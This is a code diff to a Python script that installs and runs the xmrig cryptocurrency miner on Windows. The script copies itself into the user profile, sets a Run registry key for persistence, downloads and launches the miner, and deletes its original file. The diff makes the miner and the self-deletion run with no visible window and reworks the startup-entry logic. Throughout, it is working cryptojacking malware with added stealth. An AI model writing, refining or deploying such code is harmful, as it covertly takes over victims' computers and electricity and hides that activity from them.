@@ -24,7 +24,7 @@ def copy_to_userprofile():
         sys.exit(1)
     return dest_path
 
-# Function to check if the registry entry already exists
+# Function to check if the registry startup entry already exists
 def check_registry():
     reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
     try:
@@ -37,19 +37,6 @@ def check_registry():
     except Exception as e:
         print("Error checking registry:", e)
         return False
-
-# Function to remove an existing registry entry for 'xmrservice'
-def remove_registry_entry():
-    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-    try:
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_ALL_ACCESS)
-        winreg.DeleteValue(key, "xmrservice")
-        winreg.CloseKey(key)
-        print("Deleted existing registry entry 'xmrservice'.")
-    except FileNotFoundError:
-        print("Registry entry 'xmrservice' not found, nothing to delete.")
-    except Exception as e:
-        print("Error deleting registry entry 'xmrservice':", e)
 
 # Function to add the script to the registry for startup execution
 def add_to_startup(file_path):
@@ -79,7 +66,7 @@ def check_and_download_xmrig(userprofile):
     else:
         print("xmrig.exe already exists in the userprofile directory.")
 
-# Function to run xmrig.exe with the specified parameters
+# Function to run xmrig.exe with the specified parameters in background mode (no window)
 def run_xmrig(userprofile):
     xmrig_path = os.path.join(userprofile, "xmrig.exe")
     if not os.path.exists(xmrig_path):
@@ -92,7 +79,7 @@ def run_xmrig(userprofile):
     computer_name = os.environ.get("COMPUTERNAME", "unknown")
     random_number = f"{random.randint(0, 999999):06d}"
     unique_name = f"{computer_name}_{random_number}"
-    # Build the command with replaced parameters
+    # Build the command with the replaced parameters
     cmd = [
         xmrig_path,
         "-k",
@@ -106,7 +93,8 @@ def run_xmrig(userprofile):
         "--donate-level", "0"
     ]
     try:
-        subprocess.Popen(cmd, shell=False)
+        # Use CREATE_NO_WINDOW so that no console window is shown
+        subprocess.Popen(cmd, shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
         print("xmrig.exe has been started with the specified parameters.")
     except Exception as e:
         print("Error starting xmrig.exe:", e)
@@ -124,7 +112,7 @@ def self_delete():
     try:
         with open(bat_path, "w") as bat_file:
             bat_file.write(bat_content)
-        subprocess.Popen(["cmd", "/c", bat_path], shell=False)
+        subprocess.Popen(["cmd", "/c", bat_path], shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
         print("Deleting the original script.")
     except Exception as e:
         print("Error deleting file:", e)
@@ -137,24 +125,30 @@ if __name__ == "__main__":
         sys.exit(1)
     
     current_dir = os.path.abspath(os.path.dirname(sys.argv[0]))
-    # Check if the script is running from %USERPROFILE%
+    # Step 1: Check if the script is running from %USERPROFILE%
     if current_dir.lower() != userprofile.lower():
-        # If not running from userprofile, copy the script there and run from the copy
+        # Copy the script to %USERPROFILE% and launch the copy, then delete the original
         dest_file = copy_to_userprofile()
-        # Remove existing registry entry if present, then add new entry
-        if check_registry():
-            remove_registry_entry()
-        add_to_startup(dest_file)
+        # Add to startup so that future runs will execute from %USERPROFILE%
+        if not check_registry():
+            add_to_startup(dest_file)
+        else:
+            print("Startup registry entry already exists.")
+        # Proceed with xmrig download and launch from userprofile
         check_and_download_xmrig(userprofile)
         run_xmrig(userprofile)
         self_delete()
         sys.exit()
     else:
-        # Already running from %USERPROFILE%, so just run normally without copying or self-deleting
-        # Remove existing registry entry if present, then add new entry
-        if check_registry():
-            remove_registry_entry()
-        add_to_startup(sys.argv[0])
+        # Step 2: (Already in %USERPROFILE%) Ensure xmrig.exe exists
         check_and_download_xmrig(userprofile)
+        # Step 3: Add to startup if not already added
+        if not check_registry():
+            add_to_startup(sys.argv[0])
+        else:
+            print("Startup registry entry already exists.")
+        # Step 4: Run xmrig.exe in background (no window)
         run_xmrig(userprofile)
+        # Step 5: Exit current script (xmrig continues running)
         sys.exit()
+
